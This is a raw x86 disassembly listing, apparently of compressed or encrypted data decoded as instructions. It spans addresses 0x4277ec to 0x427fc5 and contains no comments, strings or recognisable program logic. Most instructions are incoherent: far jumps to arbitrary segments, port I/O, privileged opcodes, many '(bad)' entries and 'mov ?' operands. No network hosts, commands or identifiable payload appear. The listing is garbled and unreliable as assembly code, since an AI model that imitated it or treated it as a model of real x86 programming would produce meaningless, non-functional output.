  4277ec:	xlat   BYTE PTR ds:[ebx]
  4277ed:	mov    eax,ds:0xeea6dc2c
  4277f2:	pop    ebx
  4277f3:	jno    0x4277cc
  4277f5:	jb     0x4277c4
  4277f7:	jle    0x4277cb
  4277f9:	lods   al,BYTE PTR ds:[esi]
  4277fa:	and    bl,dh
  4277fc:	mov    dl,dh
  4277fe:	cmp    BYTE PTR [ecx-0x19],cl
  427801:	pop    ds
  427802:	out    0xa2,al
  427804:	stc    
  427805:	add    BYTE PTR [ebx],0xe1
  427808:	sar    BYTE PTR [esi+ebp*4+0x5f],cl
  42780c:	jmp    0x9c10eaab
  427811:	aas    
  427812:	mov    bh,BYTE PTR [edi-0x2c7867fc]
  427818:	enter  0xaebe,0x3f
  42781c:	inc    esp
  42781d:	gs dec ecx
  42781f:	shl    DWORD PTR [esi-0x55426ac4],0xd0
  427826:	cmp    dh,BYTE PTR [ecx]
  427828:	or     BYTE PTR [esi+0x7],bh
  42782b:	lock mov bl,0x15
  42782e:	into   
  42782f:	add    cl,dl
  427831:	in     eax,0x0
  427833:	jnp    0x4277d7
  427835:	loope  0x427898
  427837:	mov    ah,0x1c
  427839:	dec    ebp
  42783a:	outs   dx,BYTE PTR ss:[esi]
  42783c:	sub    al,0xa5
  42783e:	shl    DWORD PTR [ebx+0x6b],cl
  427841:	inc    ebp
  427842:	arpl   si,di
  427844:	aam    0x8d
  427846:	aad    0x49
  427848:	mov    al,0x34
  42784a:	out    dx,eax
  42784b:	dec    esp
  42784c:	in     eax,dx
  42784d:	sub    eax,0x60540f42
  427852:	sbb    DWORD PTR [edx],0xd9ee717
  427858:	jns    0x4278cd
  42785a:	xchg   esi,eax
  42785b:	cmp    DWORD PTR ds:0x2bfebdfa,eax
  427861:	lahf   
  427862:	call   0x2b72:0x6fd28df6
  427869:	xor    cl,ch
  42786b:	sub    eax,0xfafb7b59
  427870:	push   DWORD PTR [ebx+0x32c61062]
  427876:	cmp    ch,bh
  427878:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427879:	call   0x279a:0xd96a57f2
  427880:	cld    
  427881:	nop
  427882:	mov    ds,WORD PTR [edx]
  427884:	mov    ds:0x92ea36e9,al
  427889:	pop    edx
  42788a:	jmp    0xc259:0x8afc2e28
  427891:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427892:	and    BYTE PTR [eax+0x59],dl
  427895:	aad    0x24
  427897:	ins    BYTE PTR es:[edi],dx
  427898:	mov    ebx,gs
  42789a:	lea    ecx,[ebx+0x66]
  42789d:	pushf  
  42789e:	push   0xffffff97
  4278a0:	mov    ch,bh
  4278a2:	pop    ebx
  4278a3:	push   esi
  4278a4:	jp     0x427857
  4278a6:	ret    0xa31b
  4278a9:	ins    DWORD PTR es:[edi],dx
  4278aa:	in     eax,0x52
  4278ac:	push   ecx
  4278ad:	add    BYTE PTR [eax],0x0
	...
  4278b8:	add    BYTE PTR [eax],al
  4278ba:	jns    0x4278c6
  4278bc:	sbb    BYTE PTR gs:[edi+0x7f],dh
  4278c0:	jge    0x42792d
  4278c2:	and    DWORD PTR [ebp+0x30],ecx
  4278c5:	dec    esi
  4278c6:	sahf   
  4278c7:	and    al,0x1e
  4278c9:	fs xor dh,ch
  4278cc:	add    DWORD PTR [eax],eax
  4278ce:	cld    
  4278cf:	add    DWORD PTR [eax],eax
  4278d1:	add    BYTE PTR [edi-0x40fd1905],bl
  4278d7:	add    cl,ch
  4278d9:	div    edx
  4278db:	xchg   edx,eax
  4278dc:	adc    ebp,ecx
  4278de:	stos   BYTE PTR es:[edi],al
  4278df:	imul   esi,DWORD PTR [ecx-0x5043642d],0x5c4640b2
  4278e9:	scas   al,BYTE PTR es:[edi]
  4278ea:	or     ch,ah
  4278ec:	jno    0x4278e3
  4278ee:	jmp    0xca0fde57
  4278f3:	imul   eax,DWORD PTR [ecx],0xffffffc1
  4278f6:	cli    
  4278f7:	pop    ss
  4278f8:	dec    esp
  4278f9:	cwde   
  4278fa:	and    DWORD PTR [ecx-0x1f285695],ebx
  427900:	jg     0x4278c0
  427902:	sahf   
  427903:	nop
  427904:	xchg   DWORD PTR [ebx],edi
  427906:	mov    bh,0xee
  427908:	inc    ebx
  427909:	(bad)  
  42790a:	lock mov bh,0xc7
  42790d:	dec    ch
  42790f:	es retf 0xa0d8
  427913:	repnz mov bl,0xac
  427916:	bound  edi,QWORD PTR [ebx-0x6e675c0c]
  42791c:	es in  eax,dx
  42791e:	sbb    eax,0x695d22ea
  427923:	push   0xffffffce
  427925:	daa    
  427926:	pop    esp
  427927:	into   
  427928:	leave  
  427929:	push   esi
  42792a:	dec    dx
  42792c:	sub    cl,BYTE PTR [ecx+0x6d8cc915]
  427932:	xchg   edx,eax
  427933:	pop    DWORD PTR [esi-0xab1e3a]
  427939:	and    al,bh
  42793b:	scas   eax,DWORD PTR es:[edi]
  42793c:	into   
  42793d:	and    BYTE PTR [ecx+0x54],dh
  427940:	ret    
  427941:	jo     0x42792a
  427943:	pop    ds
  427944:	popa   
  427945:	retf   0xca
  427948:	or     bh,al
  42794a:	and    BYTE PTR [ebx+0x2],0x49
  42794e:	call   0x18322420
  427953:	adc    DWORD PTR [ebp+0x23],esi
  427956:	pop    es
  427957:	cdq    
  427958:	mov    ebx,0xe37d4617
  42795d:	xor    DWORD PTR [edx],ebp
  42795f:	pop    ebp
  427960:	inc    esi
  427961:	enter  0xbe4e,0x85
  427965:	clc    
  427966:	out    0xd,eax
  427968:	push   DWORD PTR [edi-0x4f]
  42796b:	pusha  
  42796c:	adc    al,0x40
  42796e:	and    DWORD PTR [eax],edi
  427970:	push   esp
  427971:	mov    esi,0x1581f2fb
  427976:	aad    0x8
  427978:	nop
  427979:	int    0xfb
  42797b:	popa   
  42797c:	sub    cl,ah
  42797e:	arpl   WORD PTR [esi-0x154ae28e],ax
  427984:	sbb    ebp,DWORD PTR [edx+0x67]
  427987:	imul   ebp,DWORD PTR [eax],0x70
  42798a:	push   ss
  42798b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42798c:	jo     0x42791f
  42798e:	inc    ecx
  42798f:	and    al,0xc
  427991:	sub    esp,DWORD PTR [eax+0x4e]
  427994:	jge    0x4279a9
  427996:	jmp    0x427a0a
  427998:	push   edx
  427999:	jmp    0xe252:0xe1b30da9
  4279a0:	dec    edi
  4279a1:	push   edi
  4279a2:	dec    edi
  4279a3:	icebp  
  4279a4:	pushf  
  4279a5:	lods   eax,DWORD PTR ds:[esi]
  4279a6:	aaa    
  4279a7:	shr    BYTE PTR [edi-0x9],cl
  4279aa:	repz jge 0x42797a
  4279ad:	mov    esi,0x2d6bd44
  4279b2:	adc    ebx,DWORD PTR [edx]
  4279b4:	inc    edi
  4279b5:	cmp    DWORD PTR [edi+0x6c],ebx
  4279b8:	fs int 0xb9
  4279bb:	and    DWORD PTR [ebx+0x4028ada1],edx
  4279c1:	cdq    
  4279c2:	dec    ecx
  4279c3:	outs   dx,BYTE PTR ds:[esi]
  4279c4:	ficomp DWORD PTR [edi+ecx*1-0x21]
  4279c8:	fmulp  st(1),st
  4279ca:	jae    0x427999
  4279cc:	shl    ecx,0x98
  4279cf:	cld    
  4279d0:	mov    ebx,0xa5691376
  4279d5:	or     al,0xf1
  4279d7:	cdq    
  4279d8:	int3   
  4279d9:	mov    DWORD PTR [ecx+0x2b8ee925],eax
  4279df:	(bad)  ds:0xa244bac
  4279e5:	es test eax,0x7f2702e7
  4279eb:	mov    esi,0x67a96bc6
  4279f0:	and    bh,bh
  4279f2:	mov    ch,0xbb
  4279f4:	jmp    0x427997
  4279f6:	xchg   edi,eax
  4279f7:	xchg   ecx,eax
  4279f8:	push   ebp
  4279f9:	shl    BYTE PTR [ebp+0x266a90b4],1
  4279ff:	pushf  
  427a00:	mov    DWORD PTR [eax-0x6c],esi
  427a03:	and    ch,BYTE PTR ds:0x7d3911e9
  427a09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427a0a:	pop    esp
  427a0b:	pop    esi
  427a0c:	inc    ecx
  427a0d:	push   edi
  427a0e:	and    eax,0x23a27fc3
  427a13:	outs   dx,DWORD PTR ds:[esi]
  427a14:	(bad)  
  427a15:	retf   0xc17c
  427a18:	or     al,0x8e
  427a1a:	hlt    
  427a1b:	test   al,0x2c
  427a1d:	jo     0x427a6e
  427a1f:	cmp    eax,0xffe9fed0
  427a24:	dec    ebp
  427a25:	(bad)  
  427a27:	mov    bh,0x1
  427a29:	out    dx,eax
  427a2a:	sbb    ebx,edi
  427a2c:	shl    esp,0x11
  427a2f:	daa    
  427a30:	sbb    eax,0xe3967bc7
  427a35:	pop    ebx
  427a36:	mov    al,BYTE PTR [esi]
  427a38:	push   ecx
  427a39:	pushf  
  427a3a:	rol    BYTE PTR [ecx],cl
  427a3c:	mov    bh,0xca
  427a3e:	addr16 aas 
  427a40:	jb     0x427a1e
  427a42:	cdq    
  427a43:	push   edi
  427a44:	push   es
  427a45:	adc    DWORD PTR [edx-0x9],edi
  427a48:	lea    ecx,[edx]
  427a4a:	stos   BYTE PTR es:[edi],al
  427a4b:	adc    BYTE PTR [eax],0x7
  427a4e:	gs fwait
  427a50:	xchg   BYTE PTR [edx+0x6d5fadf6],dl
  427a56:	les    edx,FWORD PTR [esi+edx*4]
  427a59:	lods   eax,DWORD PTR ds:[esi]
  427a5a:	ror    DWORD PTR [ecx-0x5c],0xc1
  427a5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427a5f:	outs   dx,DWORD PTR ds:[esi]
  427a60:	in     al,dx
  427a61:	or     DWORD PTR [edx+0x21],esp
  427a64:	mov    esp,0x4021bd53
  427a69:	nop
  427a6a:	fs out dx,al
  427a6c:	xor    al,ah
  427a6e:	jmp    0x693d6ed3
  427a73:	popa   
  427a74:	fsubr  DWORD PTR [esi]
  427a76:	pop    ebx
  427a77:	cmp    ecx,DWORD PTR [ebp-0x1f8780d9]
  427a7d:	dec    eax
  427a7e:	ret    
  427a7f:	loop   0x427ae9
  427a81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427a82:	scas   eax,DWORD PTR es:[edi]
  427a83:	arpl   WORD PTR [edi-0x42],di
  427a86:	jnp    0x427a8f
  427a88:	ss mov bh,0x9d
  427a8b:	sbb    dh,BYTE PTR [ebp-0x6c]
  427a8e:	cmp    BYTE PTR [esi+0x3da73a0d],ch
  427a94:	je     0x427a84
  427a96:	xor    ch,cl
  427a98:	lahf   
  427a99:	xchg   esp,eax
  427a9a:	fiadd  DWORD PTR [ecx-0x1ee68e68]
  427aa0:	add    eax,0xb1fc4e13
  427aa5:	imul   edi,DWORD PTR [edi+ebx*1-0x44ec1adf],0x27
  427aad:	add    BYTE PTR [edx],0xd1
  427ab0:	mov    bh,0xb3
  427ab2:	inc    edx
  427ab3:	xor    al,0xbe
  427ab5:	cld    
  427ab6:	repnz imul esi,DWORD PTR [ebx+0x68ae862b],0x11f5a69c
  427ac1:	retf   0xc9c0
  427ac4:	mov    eax,0x1c996db0
  427ac9:	mov    bh,0x1e
  427acb:	and    DWORD PTR [ecx-0x17],esp
	...
  427ada:	pop    ecx
  427adb:	add    eax,ecx
  427add:	inc    esp
  427ade:	fcmovnb st,st(6)
  427ae0:	fstp   QWORD PTR [edi]
  427ae2:	arpl   WORD PTR [edi+0x50124d6c],di
  427ae8:	int    0xd
  427aea:	sub    al,0xf0
  427aec:	add    DWORD PTR [eax],eax
  427aee:	cld    
  427aef:	add    DWORD PTR [eax],eax
  427af1:	add    BYTE PTR [edi+0x12],bl
  427af4:	aaa    
  427af5:	imul   esi,DWORD PTR [ecx+0x5b],0xd69512d9
  427afc:	lods   eax,DWORD PTR ds:[esi]
  427afd:	rol    BYTE PTR [edx-0x70ea2cf4],1
  427b03:	add    bh,BYTE PTR [esp+edi*4]
  427b06:	leave  
  427b07:	lea    esi,[ecx]
  427b09:	mov    ebx,0x195f2dc8
  427b0e:	shl    BYTE PTR [esp+ecx*1],0x7b
  427b12:	inc    edx
  427b13:	push   esp
  427b14:	dec    esp
  427b15:	lods   al,BYTE PTR ds:[esi]
  427b16:	rcr    BYTE PTR [ebx+eiz*4],1
  427b19:	mov    BYTE PTR [ebx-0x55224734],dl
  427b1f:	or     ebx,DWORD PTR [ecx-0x4]
  427b22:	shr    BYTE PTR [edx-0x49fa79c9],cl
  427b28:	dec    esi
  427b29:	cmp    BYTE PTR ds:0xbfbb4717,al
  427b2f:	or     esi,edi
  427b31:	out    0x62,eax
  427b33:	xor    BYTE PTR [ecx],dl
  427b35:	mov    ecx,0x511f8a2a
  427b3a:	sti    
  427b3b:	inc    eax
  427b3c:	mov    ah,BYTE PTR [esi+0x55]
  427b3f:	or     DWORD PTR [esi-0x509e43a2],esi
  427b45:	dec    esp
  427b46:	add    dh,dl
  427b48:	iret   
  427b49:	retf   0x745
  427b4c:	aas    
  427b4d:	xor    DWORD PTR [esi-0x4e],eax
  427b50:	fmul   QWORD PTR [edx-0x2b]
  427b53:	mov    BYTE PTR [esi+0x4e],bl
  427b56:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427b58:	lods   al,BYTE PTR ds:[esi]
  427b59:	dec    eax
  427b5a:	es lahf 
  427b5c:	cli    
  427b5d:	popf   
  427b5e:	ror    DWORD PTR [ebp+0x7d],1
  427b61:	imul   DWORD PTR [ecx]
  427b63:	out    0xb4,al
  427b65:	in     al,0x57
  427b67:	sbb    ebx,DWORD PTR [edi+0xc]
  427b6a:	ror    DWORD PTR [ebp+0x37dcf370],0x2d
  427b71:	mov    edx,0x9b7711e6
  427b76:	xor    al,0x49
  427b78:	push   ebp
  427b79:	sub    ch,BYTE PTR [edx+0x34]
  427b7c:	mov    bh,0xa6
  427b7e:	inc    DWORD PTR [eax+0x71746531]
  427b84:	adc    dl,dl
  427b86:	push   eax
  427b87:	jns    0x427b55
  427b89:	cmp    al,0x3d
  427b8b:	jg     0x427b79
  427b8d:	or     BYTE PTR [edx+0x1b76f7c8],bl
  427b93:	dec    ebx
  427b94:	in     eax,dx
  427b95:	ss push ds
  427b97:	imul   ecx,ebp,0xe86189b
  427b9d:	ja     0x427bd1
  427b9f:	fucomip st,st(6)
  427ba1:	sbb    BYTE PTR [eax-0xb23b2a6],bl
  427ba7:	dec    ebp
  427ba8:	sbb    esp,DWORD PTR [eax]
  427baa:	fs pop ebx
  427bac:	jnp    0x427bf8
  427bae:	adc    BYTE PTR [edx+0x382aab03],0xb6
  427bb5:	pop    ds
  427bb6:	rcl    dh,1
  427bb8:	mov    dh,0xc0
  427bba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427bbb:	fwait
  427bbc:	jecxz  0x427bc2
  427bbe:	in     eax,dx
  427bbf:	or     dl,BYTE PTR [eax+0x1]
  427bc2:	mov    ch,BYTE PTR [edx+0x58]
  427bc5:	push   ds
  427bc6:	xor    dh,dl
  427bc8:	push   cs
  427bc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427bca:	jge    0x427be7
  427bcc:	cmp    BYTE PTR cs:[ecx+0x58],al
  427bd0:	cmp    BYTE PTR [ecx+0x40],cl
  427bd3:	mov    eax,ds:0xcd728ad7
  427bd8:	arpl   WORD PTR [ebp-0x49],bp
  427bdb:	sbb    BYTE PTR [edi],cl
  427bdd:	scas   al,BYTE PTR es:[edi]
  427bde:	jbe    0x427c39
  427be0:	or     edx,DWORD PTR [ebp+0x4deeb9f9]
  427be6:	loopne 0x427baf
  427be8:	and    ebp,DWORD PTR [ebp+0x29372654]
  427bee:	out    dx,eax
  427bef:	xchg   DWORD PTR [ebx-0x408b34db],esp
  427bf5:	cwde   
  427bf6:	jg     0x427c4b
  427bf8:	or     eax,0xc82a051f
  427bfd:	mov    al,ds:0xa3c9be4a
  427c02:	in     eax,0x5e
  427c04:	add    dl,0xdd
  427c07:	inc    esp
  427c08:	and    al,0x1
  427c0a:	lods   eax,DWORD PTR ds:[esi]
  427c0b:	sbb    ebx,ebx
  427c0d:	rol    DWORD PTR [edx+0x3bd3e993],0xdc
  427c14:	cli    
  427c15:	mov    ebx,0x8a114074
  427c1a:	xchg   ebx,eax
  427c1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427c1c:	les    ecx,FWORD PTR [eax-0x13ffc8bc]
  427c22:	mov    ch,0xa
  427c24:	mov    esp,0xcd580c74
  427c29:	adc    cl,BYTE PTR [ebx]
  427c2b:	lock xor al,0xf
  427c2e:	adc    BYTE PTR es:[edi-0x2d],bh
  427c32:	in     al,0xf9
  427c34:	out    0x93,al
  427c36:	sahf   
  427c37:	in     eax,0x61
  427c39:	les    edi,FWORD PTR [esi+edi*8+0x6459d31a]
  427c40:	fdivr  QWORD PTR [esi-0x4aa48e1f]
  427c46:	lock and DWORD PTR [ebx+0xe39f76d],eax
  427c4d:	out    dx,eax
  427c4e:	test   BYTE PTR [ebx+0x12],cl
  427c51:	lods   eax,DWORD PTR ds:[esi]
  427c52:	mov    ds:0x486494e6,al
  427c57:	mov    ebx,0xc4f1df28
  427c5c:	std    
  427c5d:	pop    es
  427c5e:	fisub  WORD PTR ds:0xd78cbede
  427c64:	or     eax,0x7a0edbea
  427c69:	jns    0x427ca5
  427c6b:	lds    esi,FWORD PTR [eax+ebx*8+0x5c]
  427c6f:	daa    
  427c70:	xchg   esi,eax
  427c71:	lahf   
  427c72:	mov    eax,ds:0x9f6a6e64
  427c77:	call   0x878a:0x9e67595c
  427c7e:	xlat   BYTE PTR ds:[ebx]
  427c7f:	xor    ebp,DWORD PTR [ebx+0x29]
  427c82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427c83:	mov    ds:0xbe6bbded,eax
  427c88:	jno    0x427c16
  427c8a:	dec    ecx
  427c8b:	push   ss
  427c8c:	imul   ebp,DWORD PTR [esi],0x76c7be59
  427c92:	je     0x427c9d
  427c94:	scas   eax,DWORD PTR es:[edi]
  427c95:	(bad)  
  427c96:	pushf  
  427c97:	lahf   
  427c98:	js     0x427d02
  427c9a:	sbb    DWORD PTR [ecx],eax
  427c9c:	ins    BYTE PTR es:[edi],dx
  427c9d:	mov    ebx,0x90995090
  427ca2:	fwait
  427ca3:	test   DWORD PTR [edx-0x1e],edx
  427ca6:	in     eax,dx
  427ca7:	(bad)  
  427ca8:	jl     0x427c8e
  427caa:	mov    ch,BYTE PTR [ecx*2+0x2b98ff51]
  427cb1:	bound  ecx,QWORD PTR [ecx-0x35]
  427cb4:	out    0x41,al
  427cb6:	mov    esi,0x960bd053
  427cbb:	mov    ah,0xf1
  427cbd:	outs   dx,DWORD PTR ds:[esi]
  427cbe:	out    0xf3,al
  427cc0:	mov    ?,esi
  427cc2:	mov    esp,0xd7218ca9
  427cc7:	addr16 xor eax,0xa86bdd04
  427ccd:	dec    edx
  427cce:	push   ecx
  427ccf:	or     bh,BYTE PTR [edx]
  427cd1:	jns    0x427c5b
  427cd3:	pop    eax
  427cd4:	mov    DWORD PTR [edi],0xe0b4ada0
  427cda:	xor    BYTE PTR [esi],ah
  427cdc:	push   ebx
  427cdd:	cmp    edi,eax
  427cdf:	sub    dl,BYTE PTR [edi+0x311ee741]
  427ce5:	ds jne 0x427cb0
  427ce8:	and    DWORD PTR [esi+0x60],0xabdb01
	...
  427cf7:	add    BYTE PTR [eax],al
  427cf9:	add    BYTE PTR [ebx],bl
  427cfb:	daa    
  427cfc:	pushf  
  427cfd:	cli    
  427cfe:	mov    esp,0xaae77ffb
  427d03:	xchg   esp,eax
  427d04:	out    dx,eax
  427d05:	cdq    
  427d06:	aaa    
  427d07:	xchg   edx,eax
  427d08:	popf   
  427d09:	fisubr DWORD PTR [eax]
  427d0b:	repnz add DWORD PTR [eax],eax
  427d0e:	cld    
  427d0f:	add    DWORD PTR [eax],eax
  427d11:	add    BYTE PTR [ebp-0x30],dh
  427d14:	dec    eax
  427d15:	addr16 mov dl,0x38
  427d18:	stos   BYTE PTR es:[edi],al
  427d19:	xor    DWORD PTR [ecx],0x1d819221
  427d1f:	(bad)  
  427d20:	sbb    DWORD PTR [ebx],edx
  427d22:	sbb    BYTE PTR [ecx-0x5ce7e0c4],al
  427d28:	test   eax,0x205c4dd1
  427d2d:	lahf   
  427d2e:	data16 stos BYTE PTR es:[edi],al
  427d30:	not    BYTE PTR [ecx+0x59]
  427d33:	loop   0x427cc9
  427d35:	lods   al,BYTE PTR ds:[esi]
  427d36:	jge    0x427d70
  427d38:	dec    esp
  427d39:	ins    DWORD PTR es:[edi],dx
  427d3a:	ins    BYTE PTR es:[edi],dx
  427d3b:	addr16 pusha 
  427d3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427d3e:	jecxz  0x427db7
  427d40:	xor    dh,dh
  427d42:	js     0x427dad
  427d44:	retf   0x8769
  427d47:	imul   edx,DWORD PTR [eax-0x59],0x1c02173f
  427d4e:	test   BYTE PTR [ebp-0x127c3f17],bh
  427d54:	call   0x78ba:0xe4e260dd
  427d5b:	sbb    al,0x93
  427d5d:	shr    BYTE PTR [ebp-0x2],0x9b
  427d61:	gs xchg ch,bh
  427d64:	sbb    BYTE PTR [esi+0x57],cl
  427d67:	push   ebx
  427d68:	iret   
  427d69:	sahf   
  427d6a:	ret    
  427d6b:	sbb    BYTE PTR [edx+ebp*2+0x5b],al
  427d6f:	bound  ecx,QWORD PTR [esi-0x6d]
  427d72:	ins    BYTE PTR es:[edi],dx
  427d73:	sub    al,0x7e
  427d76:	iret   
  427d77:	adc    dh,BYTE PTR [eax+0x64258bfd]
  427d7d:	(bad)  
  427d7e:	pushf  
  427d7f:	mov    ss,esp
  427d81:	push   ebp
  427d82:	adc    dh,dh
  427d84:	std    
  427d85:	pop    es
  427d86:	pop    ds
  427d87:	dec    esi
  427d88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427d89:	ret    
  427d8a:	adc    DWORD PTR [esi-0x694b0126],0x47
  427d91:	je     0x427da1
  427d93:	and    edx,edx
  427d95:	adc    al,0x91
  427d97:	in     al,dx
  427d98:	test   al,0xaa
  427d9a:	mov    esi,0xbae7488c
  427d9f:	scas   al,BYTE PTR es:[edi]
  427da0:	mov    esp,0x634c8450
  427da5:	std    
  427da6:	fistp  DWORD PTR [ebp-0x2]
  427da9:	test   al,0xd6
  427dab:	in     al,0xc7
  427dad:	ja     0x427dbb
  427daf:	aam    0x83
  427db1:	and    eax,0x937f1b08
  427db6:	cmp    eax,0x24e5d3f3
  427dbb:	shr    bl,0x9f
  427dbe:	mov    esp,0xa1e36170
  427dc3:	test   BYTE PTR [edx+0x41cdf2fd],al
  427dc9:	mov    ebx,0x5cda0fae
  427dce:	xor    BYTE PTR [eax-0x252b852b],bl
  427dd4:	lods   al,BYTE PTR ds:[esi]
  427dd5:	(bad)  
  427dd6:	jbe    0x427e2e
  427dd8:	mov    eax,0xa9295514
  427ddd:	nop
  427dde:	adc    esi,eax
  427de0:	les    ecx,FWORD PTR [ecx]
  427de2:	enter  0x2ba1,0x74
  427de6:	inc    ebx
  427de7:	fstp   TBYTE PTR [ebx]
  427de9:	jge    0x427e1d
  427deb:	ss into 
  427ded:	jl     0x427e26
  427def:	call   0x5262:0x41327564
  427df6:	jl     0x427e25
  427df8:	into   
  427df9:	or     BYTE PTR [ecx-0x5d],cl
  427dfc:	test   DWORD PTR [esi-0x69],0x2551d97a
  427e03:	mov    ds:0xcb6f94bb,al
  427e08:	and    eax,0x756f3ceb
  427e0d:	js     0x427dce
  427e0f:	outs   dx,DWORD PTR ds:[esi]
  427e10:	in     eax,0x99
  427e12:	sti    
  427e13:	sahf   
  427e14:	jecxz  0x427e4f
  427e16:	fsubr  DWORD PTR ds:0x2dc04b64
  427e1c:	dec    ebx
  427e1d:	jb     0x427e2f
  427e1f:	(bad)  ds:0x6f73f78f
  427e25:	push   DWORD PTR [edx]
  427e27:	jb     0x427e61
  427e29:	icebp  
  427e2a:	jg     0x427dfd
  427e2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427e2d:	je     0x427e26
  427e2f:	cli    
  427e30:	ss loop 0x427e76
  427e33:	stc    
  427e34:	sbb    dh,dh
  427e36:	arpl   WORD PTR [esi+0x615e13],bp
  427e3c:	mov    cl,0x52
  427e3e:	loop   0x427ebb
  427e40:	mov    ds:0x61618d,al
  427e45:	in     eax,dx
  427e46:	in     al,0xda
  427e48:	push   ecx
  427e49:	dec    edx
  427e4a:	mov    ch,0xb1
  427e4c:	and    cl,BYTE PTR [edx]
  427e4e:	popa   
  427e4f:	imul   edi,DWORD PTR [ebx-0x5ba322c6],0xaa7422bf
  427e59:	push   0xdfba4431
  427e5e:	cmp    esi,DWORD PTR [ebp+0x1]
  427e61:	lea    esp,[edi+0x4e]
  427e64:	mov    al,ds:0x5b8108ed
  427e69:	pop    ebx
  427e6a:	cmp    BYTE PTR [eax-0x11],al
  427e6d:	xor    eax,0xeaef521e
  427e72:	jo     0x427e9a
  427e74:	push   edi
  427e75:	imul   eax,DWORD PTR [eax+0xe1011ec],0x76a19319
  427e7f:	les    ecx,FWORD PTR [ebx+0x1da4ccce]
  427e85:	dec    edi
  427e86:	inc    ecx
  427e87:	loopne 0x427e6b
  427e89:	lds    esi,FWORD PTR [eax+0x2e]
  427e8c:	mov    al,0xaf
  427e8e:	sub    eax,0x1a0a9867
  427e93:	out    0xb1,eax
  427e95:	mov    al,BYTE PTR [edi-0x5a]
  427e98:	adc    ebp,DWORD PTR [edi-0x40]
  427e9b:	jnp    0x427e7c
  427e9d:	mov    ebp,DWORD PTR [edi+0x64]
  427ea0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427ea1:	add    dl,BYTE PTR [bx+si]
  427ea4:	iret   
  427ea5:	push   ebp
  427ea6:	rol    BYTE PTR [ebp+0x7d],1
  427ea9:	push   esi
  427eaa:	mov    ?,WORD PTR [ecx-0x64a5e9df]
  427eb0:	mov    ah,cl
  427eb2:	pop    ecx
  427eb3:	xlat   BYTE PTR ds:[ebx]
  427eb4:	sbb    ecx,DWORD PTR ds:0x9b07b2d7
  427eba:	xchg   esi,eax
  427ebb:	jmp    0x427ede
  427ebd:	fadd   DWORD PTR [ecx+0x2d]
  427ec0:	repz jae 0x427f42
  427ec3:	and    BYTE PTR [eax+0x7d46f163],bh
  427ec9:	pop    esi
  427eca:	sbb    eax,0x13445612
  427ecf:	ins    BYTE PTR es:[edi],dx
  427ed0:	es xor eax,0x89649b0d
  427ed6:	retf   0xcdcf
  427ed9:	mov    DWORD PTR [edx-0x4],eax
  427edc:	outs   dx,BYTE PTR ds:[esi]
  427edd:	push   ecx
  427ede:	call   0xe04fcd39
  427ee3:	sahf   
  427ee4:	pop    esp
  427ee5:	dec    eax
  427ee6:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427ee8:	retf   
  427ee9:	pusha  
  427eea:	inc    esp
  427eeb:	xchg   ebp,eax
  427eec:	test   BYTE PTR [ebx-0x69],cl
  427eef:	sbb    al,0x7e
  427ef1:	ret    0xc11f
  427ef4:	inc    esi
  427ef5:	and    DWORD PTR [esi],ebp
  427ef7:	sub    eax,0xdf777838
  427efc:	pop    esi
  427efd:	lock xchg ebp,eax
  427eff:	shl    DWORD PTR [edi-0x5a36e2d1],cl
  427f05:	aam    0x96
  427f07:	mov    esp,0x72c9f4c0
  427f0c:	xchg   ebx,eax
  427f0d:	push   es
	...
  427f1a:	call   0xdafe:0xfef82244
  427f21:	leavew 
  427f23:	and    dh,BYTE PTR [ecx+edx*1+0x5c]
  427f27:	inc    edi
  427f28:	sahf   
  427f29:	push   ecx
  427f2a:	and    al,0xf4
  427f2c:	add    DWORD PTR [eax],eax
  427f2e:	cld    
  427f2f:	add    DWORD PTR [eax],eax
  427f31:	add    BYTE PTR [eax+0x4356974d],bh
  427f37:	fwait
  427f38:	inc    ecx
  427f39:	or     BYTE PTR [ebx+0x282a7fbd],dl
  427f3f:	mov    ah,0xcc
  427f41:	cmp    ebp,DWORD PTR [eax+0x74]
  427f44:	jg     0x427efd
  427f46:	in     eax,0xae
  427f48:	sbb    eax,0x7dce1f2b
  427f4d:	dec    eax
  427f4e:	jns    0x427fc4
  427f50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427f51:	aaa    
  427f52:	xchg   edi,eax
  427f53:	test   BYTE PTR [edi],bh
  427f55:	add    ch,0x10
  427f58:	xchg   edi,eax
  427f59:	mov    ?,ebp
  427f5b:	(bad)  fs:[esi+0x3a407a1b]
  427f62:	imul   edi,DWORD PTR [edx],0xb6faa27a
  427f68:	fsub   DWORD PTR [ebx-0x1da4f8e0]
  427f6e:	fsub   st(1),st
  427f70:	cld    
  427f71:	xor    eax,0xaab693f2
  427f76:	ror    esi,0x69
  427f79:	test   eax,0x32266bdb
  427f7e:	and    ch,BYTE PTR [edi+edi*8-0x62b337b9]
  427f85:	aaa    
  427f86:	mov    ds:0x6c7de85d,eax
  427f8b:	je     0x427fa8
  427f8d:	or     DWORD PTR gs:[esi+0x1f],0xa37f1899
  427f95:	icebp  
  427f96:	lea    esp,[ebx-0x1c0ce161]
  427f9c:	push   edx
  427f9d:	and    al,0x1b
  427f9f:	sbb    DWORD PTR [edx+0x56],eax
  427fa2:	shl    DWORD PTR [ecx+0x49797ad4],0xc3
  427fa9:	lock pop ss
  427fab:	test   BYTE PTR [ebx+0xcb1b89d],al
  427fb1:	dec    eax
  427fb2:	fdiv   QWORD PTR [ebx]
  427fb4:	rol    DWORD PTR [ebp-0x38836739],1
  427fba:	pop    ss
  427fbb:	mov    eax,0xe720bebd
  427fc0:	sbb    bh,BYTE PTR [esi+eiz*1-0x14]
  427fc4:	xchg   esp,eax
  427fc5:	test   DWORD PTR [esi+0x64],ebx
